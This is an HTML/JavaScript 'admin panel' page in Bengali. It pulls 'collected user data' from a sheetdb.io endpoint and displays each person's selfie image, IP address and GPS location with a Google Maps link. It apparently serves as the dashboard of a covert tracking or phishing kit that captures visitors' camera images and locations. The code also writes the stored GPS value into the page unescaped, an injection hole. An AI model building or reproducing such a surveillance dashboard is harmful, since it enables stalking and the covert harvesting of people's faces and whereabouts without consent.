<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>অ্যাডমিন প্যানেল - সংগৃহীত ডাটা</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eef2f3; padding: 20px; }
        .container { max-width: 1000px; margin: auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #3498db; color: white; }
        tr:hover { background-color: #f1f1f1; }
        .user-img { width: 100px; height: 100px; object-fit: cover; border-radius: 8px; cursor: pointer; transition: 0.3s; border: 1px solid #ccc; }
        .user-img:hover { transform: scale(2.5); position: relative; z-index: 10; }
        .gps-link { color: #e74c3c; text-decoration: none; font-weight: bold; }
        .refresh-btn { display: block; width: 200px; margin: 20px auto; padding: 10px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>

<div class="container">
    <h2>সংগৃহীত ইউজার ডাটা (Live)</h2>
    <button class="refresh-btn" onclick="fetchData()">ডাটা রিফ্রেশ করুন</button>
    
    <table id="dataTable">
        <thead>
            <tr>
                <th>ছবি (Selfie)</th>
                <th>আইপি (IP Address)</th>
                <th>লোকেশন (Google Maps)</th>
            </tr>
        </thead>
        <tbody id="tableBody">
            </tbody>
    </table>
</div>

<script>
    const apiURL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet9";

    async function fetchData() {
        const tableBody = document.getElementById('tableBody');
        tableBody.innerHTML = "<tr><td colspan='3' style='text-align:center;'>ডাটা লোড হচ্ছে...</td></tr>";

        try {
            const response = await fetch(apiURL);
            const data = await response.json();

            tableBody.innerHTML = ""; // আগের ডাটা ক্লিয়ার করা

            // ডাটা উল্টো করে দেখানো (নতুন ডাটা আগে আসবে)
            data.reverse().forEach(row => {
                const tr = document.createElement('tr');

                // ছবির অংশ (Base64 থেকে ছবি তৈরি)
                const imgTd = document.createElement('td');
                const img = document.createElement('img');
                img.src = row.img; // শিট থেকে আসা Base64 স্ট্রিং
                img.className = "user-img";
                img.alt = "No Image Found";
                imgTd.appendChild(img);

                // আইপি অংশ
                const ipTd = document.createElement('td');
                ipTd.innerText = row.ip || "N/A";

                // জিপিএস অংশ (গুগল ম্যাপস লিংক তৈরি)
                const gpsTd = document.createElement('td');
                if (row.gps && row.gps !== "GPS Denied" && row.gps !== "Not Supported") {
                    const gpsLink = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(row.gps)}`;
                    gpsTd.innerHTML = `<a href="${gpsLink}" target="_blank" class="gps-link">📍 ম্যাপে দেখুন</a><br><small>${row.gps}</small>`;
                } else {
                    gpsTd.innerText = row.gps || "No Data";
                }

                tr.appendChild(imgTd);
                tr.appendChild(ipTd);
                tr.appendChild(gpsTd);
                tableBody.appendChild(tr);
            });
        } catch (error) {
            tableBody.innerHTML = "<tr><td colspan='3' style='text-align:center; color:red;'>ডাটা লোড করতে সমস্যা হয়েছে!</td></tr>";
            console.error("Fetch Error:", error);
        }
    }

    // পেজ লোড হলে ডাটা ফেচ করা
    window.onload = fetchData;
</script>

</body>
  </html>
